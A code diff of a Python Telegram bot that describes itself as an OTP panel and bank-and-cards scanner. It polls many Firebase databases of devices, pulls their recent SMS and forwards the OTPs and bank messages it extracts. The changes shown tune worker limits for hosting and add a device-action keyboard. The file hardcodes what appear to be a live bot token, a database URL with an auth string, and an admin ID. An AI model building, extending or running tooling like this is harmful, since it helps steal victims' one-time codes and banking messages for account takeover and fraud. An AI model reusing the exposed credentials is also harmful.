@@ -2,9 +2,9 @@
 """
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — VANTAGE PRO + OMNIDIMENSION EDITION       
-  HYPER-FAST 1500+ PANEL SCANNER | ANTI-RESET CACHE
+  RAILWAY ANTI-CRASH & RAM OPTIMIZED (15 WORKERS)
   DEEP SYNC (150) | BANK & CARDS SCANNER | PLAYWRIGHT
-  RAILWAY ANTI-CRASH OPTIMIZED | GHOST WEB SERVER
+  5-MIN & 30-MIN FRESH SCANNER | ALL API KEYS RESTORED
 ══════════════════════════════════════════════════════
 """
 
@@ -52,7 +52,7 @@ logging.getLogger("aiohttp").setLevel(logging.CRITICAL)
 VANTAGE_DB = "https://sannn-5d617-default-rtdb.firebaseio.com"
 VANTAGE_AUTH = "tHe daRk"
 
-TOKEN = "8859936528:AAG2x6eFAAgEY0NvnM-oH-P5BbqrJn4W_MY" # ⚠ APNA TOKEN YAHA DAALEIN
+TOKEN = "8859936528:AAG2x6eFAAgEY0NvnM-oH-P5BbqrJn4W_MY" # ⚠ NAYA TOKEN YAHA DAALEIN (BotFather se /revoke karke)
 REFERRAL_CODE = "umd67mpf"
 ADMIN_IDS: set[int] = {6860106371}
 
@@ -115,8 +115,9 @@ GLOBAL_DEVICE_CACHE: dict[str, list] = {}
 SCAN_PROGRESS = {"total": len(DATABASES) if len(DATABASES) > 0 else 1, "completed": 0}
 SETTINGS = {"base_price": 30, "global_panels": []}
 
-HTTP_SEMAPHORE = asyncio.Semaphore(100)
-WORKER_SEMAPHORE = asyncio.Semaphore(100)
+# 🔥 RAM PROTECTION APPLIED (Safe Limits for Railway) 🔥
+HTTP_SEMAPHORE = asyncio.Semaphore(20)
+WORKER_SEMAPHORE = asyncio.Semaphore(20)
 API_LOCK = asyncio.Lock()
 
 SYS_SETTINGS = {
@@ -395,7 +396,7 @@ def device_label(d: 'Device') -> str: return " & ".join(d.numbers) if d.numbers 
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=100, use_dns_cache=True, ttl_dns_cache=300)
+        connector = aiohttp.TCPConnector(limit=50, use_dns_cache=True, ttl_dns_cache=300)
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
@@ -672,7 +673,7 @@ def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboard
         rows.append(row)
 
     nav = []
-    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"pg:{page - 1}"))
+    if page > 0: nav.append(InlineKeyboardButton("⬅️️ Prev", callback_data=f"pg:{page - 1}"))
     nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"pg:{page + 1}"))
     rows.append(nav)
@@ -727,6 +728,12 @@ def auto_forward_msg(sms: dict, num_label: str) -> str:
     if bank_info: return f"🏦 <b>BANK SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n{bank_info}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
     if otp: return f"🔐 <b>NEW OTP RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
     return f"📩 <b>NEW SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\nNumber : {num_label}\nFrom : {sender}\nDate : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
+
+def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("View All Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Device Info", callback_data=f"info:{dev_id}")],
+        [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
+    ])
 
 def admin_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
@@ -929,9 +936,8 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Action cancelled. Session closed. Type /call to start over.")
     return ConversationHandler.END
 
-
 # ==========================================
-# 📩 CORE TELEGRAM HANDLERS (FULLY RESTORED)
+# 📩 CORE TELEGRAM HANDLERS 
 # ==========================================
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1660,7 +1666,7 @@ async def fetch_recent_sms_safely(d: Device, silent=False):
 
 WORK_QUEUE = asyncio.Queue(maxsize=10000)
 ACTIVE_WORKERS = []
-MAX_WORKERS = 50 
+MAX_WORKERS = 15 
 
 async def worker_auto_scaler():
     global ACTIVE_WORKERS
@@ -1703,7 +1709,7 @@ async def db_processor_worker():
                         await asyncio.gather(*(fetch_recent_sms_safely(d, silent=False) for d in active_devs[i:i+10]))
             
             WORK_QUEUE.task_done()
-            await asyncio.sleep(0.1) 
+            await asyncio.sleep(0.5) 
         except asyncio.CancelledError: break
         except Exception: pass
 
